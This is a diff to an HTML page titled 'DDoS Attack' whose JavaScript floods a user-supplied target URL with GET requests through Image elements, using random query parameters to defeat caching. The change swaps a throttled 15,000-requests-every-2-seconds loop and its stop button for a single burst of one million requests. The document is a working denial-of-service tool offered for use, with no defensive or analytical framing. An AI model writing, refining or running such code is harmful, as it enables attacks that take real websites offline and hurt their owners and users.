@@ -5,19 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DDoS Attack</title>
     <script>
-        // Variable to track the status of the attack
-        let attackInProgress = false;
-
         // Function to launch a DDoS attack
-        async function launchDDoS() {
-            // Check if an attack is already in progress
-            if (attackInProgress) {
-                console.log("Attack is already in progress.");
-                return;
-            }
-
+        function launchDDoS() {
             // Get the target URL from the user
-            let targetURL = document.getElementById("targetURL").value;
+            const targetURL = document.getElementById("targetURL").value;
 
             // Validate input
             if (!targetURL) {
@@ -25,47 +16,20 @@
                 return;
             }
 
-            // Initialize a counter for completed requests
-            let completedRequests = 0;
-
-            // Set the status of the attack to in progress
-            attackInProgress = true;
-
-            // Launch the DDoS attack
-            let interval = setInterval(function() {
-                // Check if the attack has been stopped or completed
-                if (!attackInProgress || completedRequests >= 15000) {
-                    clearInterval(interval);
-                    console.log("DDoS attack stopped.");
-                    attackInProgress = false;
-                    return;
-                }
-
-                // Send 15,000 requests
-                for (let i = 0; i < 15000; i++) {
-                    // Create an image element to make a GET request
-                    let img = new Image();
-                    
-                    // Generate a random parameter to bypass caching
-                    let randomParam = "param" + Math.floor(Math.random() * 1000000);
-                    
-                    // Set the image source to the target URL with a random parameter
-                    img.src = targetURL + "?" + randomParam;
-
-                    // Increment the counter for completed requests
-                    completedRequests++;
-                }
+            // Send requests in a loop
+            for (let i = 0; i < 1000000; i++) {
+                // Create an image element to make a GET request
+                let img = new Image();
                 
-                // Log progress
-                console.log("Sent 15,000 requests.");
+                // Generate a random parameter to bypass caching
+                let randomParam = "param" + Math.floor(Math.random() * 1000000);
+                
+                // Set the image source to the target URL with a random parameter
+                img.src = targetURL + "?" + randomParam;
+            }
 
-            }, 2000); // Send 15,000 requests every 2 seconds
-        }
-
-        // Function to stop the DDoS attack
-        function stopDDoS() {
-            // Set the status of the attack to stopped
-            attackInProgress = false;
+            // Display a message indicating that the attack has been launched
+            console.log("DDoS attack launched successfully. Target: " + targetURL + ", Number of requests: 1,000,000");
         }
     </script>
 </head>
@@ -77,7 +41,6 @@
         <input type="text" id="targetURL" name="targetURL" placeholder="Enter the target URL"><br><br>
         
         <button type="button" onclick="launchDDoS()">Launch DDoS Attack</button>
-        <button type="button" onclick="stopDDoS()">Stop DDoS Attack</button>
     </form>
 </body>
 </html>
